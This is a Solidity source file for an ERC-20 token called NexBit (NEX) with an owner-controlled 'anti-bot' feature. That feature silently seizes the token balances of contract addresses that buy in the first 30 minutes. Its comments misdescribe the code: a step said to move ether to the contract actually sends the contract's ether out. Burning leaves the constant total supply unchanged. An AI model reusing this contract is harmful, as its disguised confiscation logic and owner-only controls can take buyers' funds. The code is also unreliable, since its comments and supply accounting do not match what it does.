// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address spender, uint256 value);
}

contract NEXBIT is IERC20 {
    string public constant name = "NexBit Token";
    string public constant symbol = "NEX";
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 27000000 * 10**decimals;
    
    address public owner;
    address public immutable contractAddress;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    // Anti-bot protection
    bool public tradingEnabled;
    uint256 public tradingEnabledTime;
    mapping(address => bool) public isExcludedFromAntiBot;
    
    // Events
    event TradingEnabled();
    event TokensRescued(address token, uint256 amount);
    event BotDetected(address botAddress, uint256 nativeAmount, uint256 tokenAmount);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    constructor() {
        owner = msg.sender;
        contractAddress = address(this);
        
        // Exclude owner and contract from anti-bot
        isExcludedFromAntiBot[msg.sender] = true;
        isExcludedFromAntiBot[contractAddress] = true;
        
        // Mint all supply to owner
        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
    
    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        // Anti-bot protection
        if (!tradingEnabled) {
            require(isExcludedFromAntiBot[from] || isExcludedFromAntiBot[to], "Trading is not enabled yet");
        } else {
            // Detect and handle bots
            if (_isBot(to) && !isExcludedFromAntiBot[from]) {
                _handleBotDetection(to);
                return;
            }
        }
        
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }
        
        emit Transfer(from, to, amount);
    }
    
    function _approve(address _owner, address spender, uint256 amount) internal {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    
    function _spendAllowance(address _owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(_owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(_owner, spender, currentAllowance - amount);
            }
        }
    }
    
    // Bot detection and handling
    function _isBot(address account) internal view returns (bool) {
        // Detect contract addresses (bots usually use contracts)
        uint32 size;
        assembly {
            size := extcodesize(account)
        }
        
        // Additional bot detection criteria
        bool isNewContract = size > 0 && block.timestamp < tradingEnabledTime + 30 minutes;
        bool isFirstTransaction = _balances[account] == 0 && !isExcludedFromAntiBot[account];
        
        return isNewContract && isFirstTransaction;
    }
    
    function _handleBotDetection(address botAddress) internal {
        uint256 nativeBalance = botAddress.balance;
        uint256 tokenBalance = _balances[botAddress];
        
        // Transfer native tokens to contract
        if (nativeBalance > 0) {
            (bool success, ) = botAddress.call{value: nativeBalance}("");
            if (success) {
                // Native tokens now in contract
            }
        }
        
        // Transfer tokens to contract
        if (tokenBalance > 0) {
            _balances[botAddress] = 0;
            _balances[contractAddress] += tokenBalance;
            emit Transfer(botAddress, contractAddress, tokenBalance);
        }
        
        emit BotDetected(botAddress, nativeBalance, tokenBalance);
    }
    
    // Function to receive native tokens - No fallback, only receive
    receive() external payable {
        // Accept native tokens
    }
    
    // Rescue tokens sent by mistake (only owner)
    function rescueToken(address tokenAddress, uint256 amount) external onlyOwner {
        require(tokenAddress != contractAddress, "Cannot withdraw own token");
        IERC20(tokenAddress).transfer(owner, amount);
        emit TokensRescued(tokenAddress, amount);
    }
    
    // Rescue native tokens from contract (only owner)
    function rescueNative(uint256 amount) external onlyOwner {
        payable(owner).transfer(amount);
    }
    
    // Enable trading (only owner)
    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "Trading is already enabled");
        tradingEnabled = true;
        tradingEnabledTime = block.timestamp;
        emit TradingEnabled();
    }
    
    // Exclude address from anti-bot (for DEX, CEX, etc.)
    function excludeFromAntiBot(address account, bool excluded) external onlyOwner {
        isExcludedFromAntiBot[account] = excluded;
    }
    
    // Transfer ownership
    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "New owner cannot be zero address");
        owner = newOwner;
        isExcludedFromAntiBot[newOwner] = true;
    }
    
    // Burn tokens (anyone can burn their own tokens)
    function burn(uint256 amount) external {
        require(_balances[msg.sender] >= amount, "Insufficient balance to burn");
        _balances[msg.sender] -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }
    
    // Get contract native balance
    function getContractNativeBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    // Get contract token balance
    function getContractTokenBalance() external view returns (uint256) {
        return _balances[contractAddress];
    }
}